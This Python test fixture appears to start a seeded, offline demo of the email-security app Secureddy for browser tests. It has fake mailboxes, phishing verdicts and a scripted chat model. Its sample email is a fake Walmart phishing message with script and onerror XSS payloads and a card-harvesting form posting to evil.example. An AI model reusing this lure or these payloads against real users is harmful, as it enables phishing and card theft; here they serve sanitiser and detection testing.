"""A seeded, offline Secureddy for browser tests and screenshots.

``DemoServer`` runs the real web app under uvicorn on a free local port with:
one person, three accounts (Gmail, Outlook, Yahoo), a week of checked mail
(safe, suspicious, quarantined, with link advice), fake connectors that serve
an HTML email for "Read email" and answer searches, and a scripted chat model
that streams and calls the real tools ("most suspicious" -> top_suspicious).
"""

from __future__ import annotations

import asyncio
import socket
import threading
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import uvicorn
from pydantic import SecretStr

from reddysec.assistant.llm import ChatReply, ToolCall
from reddysec.config import Settings
from reddysec.core.ids import new_id
from reddysec.mail.base import SearchHit
from reddysec.models import Signal, SignalStage, TriageLane, Verdict, VerdictLevel
from reddysec.store.db import Database
from reddysec.store.models import MailboxRow, MessageRow, UserRow
from reddysec.web.app import create_app

EMAIL = "avery@example.com"

DEMO_HTML = b"""From: Walmart <orders@walmart-deliveries.net>\r
To: avery@gmail.com\r
Subject: Your order could not be delivered\r
Date: Fri, 06 Nov 2026 09:12:00 -0800\r
Message-ID: <demo-1@walmart-deliveries.net>\r
MIME-Version: 1.0\r
Content-Type: text/html; charset=utf-8\r
\r
<html><head><style>body{background:url(https://tracker.example/bg.png)}</style>
<script>alert('x')</script></head><body>
<h2 style="color:#0071ce;position:fixed">Walmart</h2>
<p>We tried to deliver your package. Please confirm your address within 24 hours.</p>
<p><a href="https://walmart-deliveries.net/confirm?utm_source=mail">Confirm delivery</a></p>
<p><img src="https://tracker.example/pixel.gif" width="1" height="1" onerror="alert(1)"></p>
<form action="https://evil.example/steal"><input name="card"></form>
<p>Thanks for shopping with us.<br><a href="https://www.walmart.com/help">Help center</a></p>
</body></html>\r
"""


def _verdict(level: str, summary: str, signals: list[tuple[str, int, str]], urls: list[dict[str, Any]] | None = None,
             attachments: list[dict[str, Any]] | None = None) -> dict[str, Any]:
    scores = {"safe": 6, "suspicious": 52, "malicious": 91}
    v = Verdict(
        level=VerdictLevel(level), score=scores[level], summary=summary, lane=TriageLane.DETONATE,
        signals=[Signal(code=c, stage=SignalStage.STATIC, weight=w, title=t) for c, w, t in signals],
        urls=urls or [], attachments=attachments or [], engine_version="demo",
    )
    data = v.model_dump(mode="json")
    return data


class DemoChat:
    """Streams like Claude: a tool call for the obvious questions, then a short answer."""

    def __init__(self) -> None:
        self.calls: list[list[dict[str, Any]]] = []

    def _plan(self, messages: list[dict[str, Any]]) -> ChatReply:
        last = messages[-1]
        if last.get("role") == "tool":
            names = [r["name"] for r in last.get("results", [])]
            if "top_suspicious" in names:
                return ChatReply(
                    "These **2 emails** need a look. The worst is the fake Walmart delivery notice: its link opens a "
                    "look-alike site. Don't click it.\n\n- Quarantined emails stay out of your inbox.\n- Open a card to see why."
                )
            if "search_messages" in names:
                return ChatReply("Here is what I found. Open any card for the full report.")
            if "list_accounts" in names:
                return ChatReply("You have **3 accounts** connected. All are protected.")
            return ChatReply("Done.")
        text = str(last.get("text", "")).lower()
        if "suspicious" in text or "need" in text or "look" in text:
            return ChatReply("Let me check.", (ToolCall("t1", "top_suspicious", {"n": 5, "days": 7}),))
        if "search" in text or "walmart" in text:
            return ChatReply("", (ToolCall("t2", "search_messages", {"query": "walmart"}),))
        if "account" in text:
            return ChatReply("", (ToolCall("t3", "list_accounts", {}),))
        if "weather" in text or "capital" in text:
            return ChatReply("I can only help with your email safety. Want me to show what needs a look?")
        return ChatReply("I can tell you what looks suspicious, find emails, or explain a link.")

    async def complete(self, system: str, messages: list[dict[str, Any]], tools: list[Any]) -> ChatReply:
        self.calls.append(messages)
        return self._plan(messages)

    async def stream(self, system: str, messages: list[dict[str, Any]], tools: list[Any]):
        self.calls.append(messages)
        reply = self._plan(messages)
        for word in reply.text.split(" "):
            await asyncio.sleep(0.01)
            yield word + " "
        yield reply


class DemoConnectors:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str]] = []

    async def __call__(self, mailbox: MailboxRow) -> Any:
        registry = self

        class Connector:
            async def fetch_raw(self, pid: str) -> bytes:
                registry.calls.append(("fetch_raw", pid))
                return DEMO_HTML

            async def search(self, query: str, limit: int = 20) -> list[SearchHit]:
                registry.calls.append(("search", query))
                if mailbox.provider != "gmail":
                    return []
                return [
                    SearchHit("demo-p1", "Walmart", "orders@walmart-deliveries.net", "Your order could not be delivered",
                              datetime.now(UTC) - timedelta(hours=3), "We tried to deliver your package"),
                    SearchHit("unseen-1", "Walmart", "help@walmart.com", "Your receipt from Walmart",
                              datetime.now(UTC) - timedelta(days=12), "Thanks for shopping with us"),
                ]

            async def archive(self, pid: str) -> None:
                registry.calls.append(("archive", pid))

            async def set_read(self, pid: str, read: bool) -> None:
                registry.calls.append(("read", pid))

            async def trash(self, pid: str) -> None:
                registry.calls.append(("trash", pid))

            async def web_link(self, pid: str) -> str:
                return "https://mail.google.com/"

            async def revoke(self) -> bool:
                return True

        return Connector()


async def seed(db: Database) -> dict[str, Any]:
    now = datetime.now(UTC)
    user = UserRow(id=new_id("usr"), display_name="Avery Lane", login_email=EMAIL, role="principal")
    boxes = [
        MailboxRow(id=new_id("mbx"), user_id=user.id, provider="gmail", address="avery@gmail.com", mode="scan",
                   status="active", labels={"Secureddy": "L1"}, policy={}, last_sync_at=now - timedelta(minutes=2)),
        MailboxRow(id=new_id("mbx"), user_id=user.id, provider="microsoft", address="avery@outlook.com", mode="hold",
                   status="active", labels={"Secureddy": "F1"}, policy={}, last_sync_at=now - timedelta(minutes=1)),
        MailboxRow(id=new_id("mbx"), user_id=user.id, provider="yahoo", address="avery@yahoo.com", mode="scan",
                   status="error", labels={"Secureddy": "Y"}, policy={}, last_error="IMAP login rejected: AUTHENTICATIONFAILED"),
    ]
    gmail, outlook, yahoo = boxes
    phish_urls = [
        {"url": "https://walmart-deliveries.net/confirm?utm_source=mail", "level": "malicious", "score": 92,
         "final_url": "https://walmart-deliveries.net/login", "detonated": True, "click_advice": "do_not_open",
         "click_advice_reason": "It opens a fake Walmart sign-in page that asks for your card."},
        {"url": "https://www.walmart.com/help", "level": "safe", "score": 2, "detonated": True,
         "click_advice": "safe_to_open", "click_advice_reason": "It goes to walmart.com."},
    ]
    rows = [
        (gmail, "demo-p1", "orders@walmart-deliveries.net", "Walmart", "Your order could not be delivered", 3, "malicious", True,
         _verdict("malicious", "This looks like a fake Walmart delivery notice. Its link opens a look-alike sign-in page.",
                  [("url.lookalike", 70, "A link imitates walmart.com"), ("subject.urgency", 10, "Pressure to act fast")],
                  phish_urls)),
        (outlook, "demo-p2", "billing@paypa1-secure.com", "PayPal Billing", "Unusual sign-in to your account", 20, "suspicious", False,
         _verdict("suspicious", "The sender's address imitates PayPal. Be careful with its links.",
                  [("sender.lookalike", 45, "The sender imitates PayPal")],
                  [{"url": "https://paypa1-secure.com/verify", "level": "suspicious", "score": 55,
                    "click_advice": "open_in_reading_room", "click_advice_reason": "We could not tell where it leads."}])),
        (gmail, "demo-p3", "news@nytimes.com", "The New York Times", "The Morning: Friday's top stories", 5, "safe", False,
         _verdict("safe", "A newsletter you get often. Nothing wrong found.", [("auth.dmarc_pass_aligned", -15, "Verified sender")])),
        (outlook, "demo-p4", "dr.patel@clinic.example", "Dr. Patel's office", "Appointment reminder for Tuesday", 30, "safe", False,
         _verdict("safe", "Nothing wrong found.", [])),
        (gmail, "demo-p5", "receipts@walmart.com", "Walmart", "Your Walmart receipt", 50, "safe", False,
         _verdict("safe", "Walmart really sent this.", [("auth.dmarc_pass_aligned", -15, "Verified sender")],
                  attachments=[{"filename": "receipt.pdf", "sha256": "0" * 64, "level": "safe", "score": 0}])),
        (yahoo, "INBOX:1:7", "giftcards@prize-center.example", "Prize Center", "You won a $500 gift card", 70, "suspicious", False,
         _verdict("suspicious", "Asks you to buy gift cards. Scammers do this.", [("bec.gift_card", 50, "Asks for gift cards")])),
    ]
    async with db.session() as s:
        s.add(user)
        for b in boxes:
            s.add(b)
        await s.flush()
        for mb, pid, addr, name, subject, hours, level, quarantined, verdict in rows:
            s.add(MessageRow(
                id=new_id("msg"), mailbox_id=mb.id, provider_message_id=pid, from_address=addr, from_name=name,
                subject=subject, received_at=now - timedelta(hours=hours), url_count=len(verdict.get("urls", [])),
                attachment_count=len(verdict.get("attachments", [])), state="done", lane="detonate", level=level,
                score=verdict["score"], verdict=verdict, quarantined=quarantined, analyzed_at=now - timedelta(hours=hours),
            ))
    return {"user": user, "mailboxes": boxes}


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


class DemoServer:
    def __init__(self, tmp: Path, *, chat: Any = None, port: int | None = None) -> None:
        self.port = port or free_port()
        self.base_url = f"http://127.0.0.1:{self.port}"
        self.settings = Settings(
            env="test", dev_login_enabled=True, base_url=self.base_url,
            database_url=f"sqlite+aiosqlite:///{tmp / 'demo.db'}", artifacts_dir=str(tmp / "artifacts"),
            secret_key=SecretStr("demo-secret-key-for-browser-tests-only"),
        )
        self.db = Database(self.settings.database_url)
        self.chat = chat if chat is not None else DemoChat()
        self.connectors = DemoConnectors()
        self.app = create_app(self.settings, db=self.db, chat_model=self.chat, connector_factory=self.connectors)
        self._server: uvicorn.Server | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> DemoServer:
        async def prepare() -> None:
            await self.db.create_all()
            self.world = await seed(self.db)
            await self.db.dispose()

        # A thread of its own: the caller may already run an event loop (Playwright).
        worker = threading.Thread(target=lambda: asyncio.run(prepare()))
        worker.start()
        worker.join()
        config = uvicorn.Config(self.app, host="127.0.0.1", port=self.port, log_level="warning", lifespan="on")
        self._server = uvicorn.Server(config)
        self._thread = threading.Thread(target=self._server.run, daemon=True)
        self._thread.start()
        deadline = time.time() + 15
        while time.time() < deadline and not self._server.started:
            time.sleep(0.05)
        return self

    def stop(self) -> None:
        if self._server is not None:
            self._server.should_exit = True
        if self._thread is not None:
            self._thread.join(timeout=10)


def sign_in(page: Any, base_url: str, email: str = EMAIL) -> None:
    """Developer sign-in through the real form."""
    page.goto(f"{base_url}/login")
    page.evaluate("document.querySelectorAll('details').forEach(function (d) { d.open = true; })")
    dev = page.locator("form[action='/auth/dev-login']")
    dev.locator("input[name=email]").fill(email)
    dev.locator("button[type=submit]").click()
    page.wait_for_url(f"{base_url}/")
